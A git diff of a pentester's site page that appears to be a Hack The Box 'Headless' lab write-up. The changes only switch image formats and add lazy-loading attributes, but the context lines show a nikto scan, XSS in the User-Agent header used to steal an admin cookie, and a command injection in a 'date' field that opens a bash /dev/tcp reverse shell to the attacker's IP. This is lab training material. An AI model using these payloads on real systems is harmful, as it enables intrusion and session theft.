@@ -16,7 +16,7 @@
     <header class="spine">
         <div class="spine-id">
             <a class="si-id" href="../index.html" aria-label="Frédéric Goossens - Home">
-                <span class="si-photo"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></span>
+                <span class="si-photo"><img src="../assets/images/pfp.webp" alt="Frédéric Goossens"></span>
                 <span class="si-prompt"><span class="sigil">$</span>whoami</span>
                 <span class="si-name">Frédéric Goossens</span>
                 <span class="si-roles"><span>Pentester</span><span>OSCP · BSCP</span></span>
@@ -41,7 +41,7 @@
     </header>
 
     <div class="topbar">
-        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt="Frédéric Goossens"></a>
+        <a class="topbar-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.webp" alt="Frédéric Goossens"></a>
         <div class="tb-actions">
             <button class="theme-btn" type="button" data-theme-toggle aria-label="Toggle color theme" aria-pressed="false"><svg class="i-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg><svg class="i-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8z"/></svg></button>
             <button class="menu-btn" type="button" data-menu-open aria-label="Open menu" aria-controls="menu" aria-haspopup="dialog" aria-expanded="false">
@@ -52,7 +52,7 @@
 
     <div id="menu" role="dialog" aria-modal="true" aria-label="Navigation menu" aria-hidden="true" inert>
         <div class="menu-top">
-            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.jpg" alt=""><span>Frédéric Goossens</span></a>
+            <a class="mi-id" href="../index.html" aria-label="Frédéric Goossens - Home"><img src="../assets/images/pfp.webp" alt=""><span>Frédéric Goossens</span></a>
             <button class="close-btn" type="button" data-menu-close>Close ×</button>
         </div>
         <nav aria-label="Mobile">
@@ -172,7 +172,7 @@
 <details>
 <summary>Web</summary>
 <div class="inner">
-<p><a href="http://headless.htb:5000/">http://headless.htb:5000/</a></p><figure><img src="../assets/images/htb/headless/01-untitled.png" alt=""></figure><p><code>nikto -h http://headless.htb:5000/ -C All</code></p><pre><code>- Nikto v2.5.0
+<p><a href="http://headless.htb:5000/">http://headless.htb:5000/</a></p><figure><img src="../assets/images/htb/headless/01-untitled.png" alt="" loading="lazy" decoding="async"></figure><p><code>nikto -h http://headless.htb:5000/ -C All</code></p><pre><code>- Nikto v2.5.0
 ---------------------------------------------------------------------------
 + Target IP:          10.10.11.8
 + Target Hostname:    headless.htb
@@ -197,12 +197,12 @@
 <blockquote>the message paramater gets properly validated and response with an error message with the request and its headers. However, the User-Agent header isn’t properly sanitized and we can inject XSS here.</blockquote>
 
 <ol><li>Keep the script tag in the message parameter to trigger the error while crafting our payload.</li>
-<li>After we have something that looks valid remove the script tag from the message parameter<figure><img src="../assets/images/htb/headless/02-untitled-1.png" alt=""></figure></li>
+<li>After we have something that looks valid remove the script tag from the message parameter<figure><img src="../assets/images/htb/headless/02-untitled-1.png" alt="" loading="lazy" decoding="async"></figure></li>
 <li>Send the request, and we can see the cookie in our logs of the webserver<pre><code>┌──(parallels㉿kali)-[~]
 └─$ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.8 - [12/Apr/2024 15:13:22] "GET /?is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -</code></pre></li>
-<li>Replace the cookie and we can access the administrator dashboard:<figure><img src="../assets/images/htb/headless/03-untitled-2.png" alt=""></figure></li></ol>
+<li>Replace the cookie and we can access the administrator dashboard:<figure><img src="../assets/images/htb/headless/03-untitled-2.png" alt="" loading="lazy" decoding="async"></figure></li></ol>
 
 <h3>RCE</h3>
 
@@ -222,7 +222,7 @@ Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
 Upgrade-Insecure-Requests: 1
 
 date=a;bash+-c+'exec+bash+-i+%26&gt;/dev/tcp/10.10.16.6/4444+&lt;%261'</code></pre></li>
-<li>Established a shell as user dvir<figure><img src="../assets/images/htb/headless/04-untitled-3.png" alt=""></figure></li>
+<li>Established a shell as user dvir<figure><img src="../assets/images/htb/headless/04-untitled-3.png" alt="" loading="lazy" decoding="async"></figure></li>
 <li>Upgrade shell<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
 CTRL+Z
 stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;</code></pre><p>Found user flag → <mark class="highlight-teal" data-notion-highlight="teal">0155ece43df9c20b4d8cd04ca3e10f37</mark></p></li></ol>
